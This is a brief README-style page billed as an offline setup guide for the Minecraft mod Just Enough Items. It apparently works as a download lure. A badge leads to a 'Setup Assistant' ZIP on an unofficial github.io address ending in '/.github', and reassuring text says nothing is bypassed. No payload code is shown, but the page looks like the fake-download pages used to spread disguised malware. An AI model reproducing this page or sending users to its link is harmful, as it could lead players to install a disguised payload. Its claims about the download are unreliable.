# Just Enough Items (JEI) — Offline Setup Guide

[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://just-enough-items-minecraft-mod.github.io/.github)

> **Friendly heads-up!**  
> This guide shows you how to copy the official JEI **.jar** file to a computer with no internet, then enable all its recipe-search magic. Nothing here bypasses licenses or adds paid-only content — it’s just smart, offline deployment. 👍

## ⚙️ How to Use

1. Click the **Download** badge above and grab the ZIP that matches your Minecraft version.  
2. Copy the ZIP to your offline computer (USB stick works great).  
3. **Extract** the archive with 7-Zip or WinRAR — you will see:<br/>
   `│  jei-[version].jar`<br/>
   `└─ README_offline.txt`  
4. Move the `jei-[version].jar` file into your local `mods` folder:<br/>
   `C:\Users\<You>\AppData\Roaming\.minecraft\mods\` (Windows)<br/>
   `~/Library/Application Support/minecraft/mods/` (macOS)<br/>
   `~/.minecraft/mods/` (Linux)  
5. Start Minecraft with **Forge**, **Fabric**, or **NeoForge** (same version as the jar).  
6. Press **E** in-game — the JEI panel appears on the right. All done!
